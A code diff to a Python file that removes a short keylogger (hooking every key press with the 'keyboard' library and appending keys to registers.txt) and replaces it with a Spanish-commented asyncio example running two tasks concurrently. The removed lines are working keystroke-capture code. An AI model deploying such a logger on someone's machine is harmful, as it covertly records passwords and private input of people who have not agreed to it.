@@ -1,14 +1,23 @@
-import keyboard
+import asyncio
 
-def on_key_press(key):
-    keys_to_ignore = ["alt", "tab", "delete", "backspace", "esc", "enter"]
+# Definimos la primera tarea asincrona
+async def tarea_1():
+    print("Tarea 1 iniciada")
+    await asyncio.sleep(1) # Esperar un segundo
+    print("Tarea 1 finalizada")
 
-    with open("registers.txt", "a") as file:
-        if key.name not in keys_to_ignore and key.name.isalnum():
-            if key.name == "space":
-                file.write(" ")
-            else:
-                file.write(key.name)
+async def tarea_2():
+    print("Tarea 2 iniciada")
+    await asyncio.sleep(1) # Esperar un segundo
+    print("Tarea 2 finalizada")
 
-keyboard.on_press(on_key_press)
-keyboard.wait()
+async def tarea_paralelo():
+    # Creamos dos tareas a partir de las funciones tarea_1() y tarea_2()
+    _tarea_1 = asyncio.create_task(tarea_1())
+    _tarea_2 = asyncio.create_task(tarea_2())
+
+    # Ejecutar ambas tareas
+    await asyncio.gather(_tarea_1, _tarea_2)
+
+# Ejecutar la funcion tarea_paralelo
+asyncio.run(tarea_paralelo())
